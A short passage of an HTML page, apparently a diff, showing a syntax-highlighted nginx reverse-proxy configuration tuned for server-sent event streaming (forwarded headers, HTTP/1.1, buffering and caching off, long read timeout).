+<span class="hljs-attribute">proxy_set_header</span> X-Forwarded-For <span class="hljs-variable">$proxy_add_x_forwarded_for</span>;
+<span class="hljs-attribute">proxy_set_header</span> X-Forwarded-Proto <span class="hljs-variable">$scheme</span>;
+<span class="hljs-attribute">proxy_http_version</span> <span class="hljs-number">1</span>.<span class="hljs-number">1</span>; <span class="hljs-comment"># ✓ HTTP/1.1 (good for SSE)</span>
+ <span class="hljs-attribute">proxy_buffering</span> <span class="hljs-literal">off</span>; <span class="hljs-comment"># ✓ if you want streams immediately</span>
+ <span class="hljs-attribute">proxy_cache</span> <span class="hljs-literal">off</span>; <span class="hljs-comment"># ✓ No caching</span>
+ <span class="hljs-attribute">proxy_read_timeout</span> <span class="hljs-number">300s</span>; <span class="hljs-comment"># ✓ Long timeout for persistent</span>
+}
+}
+
+</div></code></pre>
 
 </body>
 </html>
